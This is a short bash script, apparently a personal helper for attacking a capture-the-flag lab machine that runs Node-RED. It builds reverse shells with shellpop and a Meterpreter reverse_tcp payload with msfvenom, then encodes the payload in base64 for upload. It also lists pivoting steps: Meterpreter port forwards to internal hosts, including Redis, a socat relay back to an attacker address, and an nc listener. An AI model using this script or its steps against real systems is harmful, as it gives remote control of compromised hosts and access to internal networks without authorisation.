#!/bin/bash

ip=$(ifconfig | grep tun0 -A 1 | tail -1 | xargs | cut -d " " -f 2)
id=$(curl -s -X POST http://10.10.10.94:1880/ | cut -d '"' -f 4)

echo "http://10.10.10.94:1880/red/$id"
echo " "
shellpop --reverse --number 5 --host tun0 --port 2001 
echo " "
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=2002 -f elf -o peaky.elf > /dev/null 2>&1
base64 -w 0 peaky.elf
echo " "
echo "upload socat"
echo "portfwd add -l 80 -r 172.19.0.3 -p 80"
echo "portfwd add -l 6379 -r 172.19.0.2 -p 6379"
echo "shell"
echo "./socat tcp-listen:4444,reuseaddr,fork tcp:10.10.15.27:5555"
echo "set up nc -lvnp 5555"
echo "run script.sh"
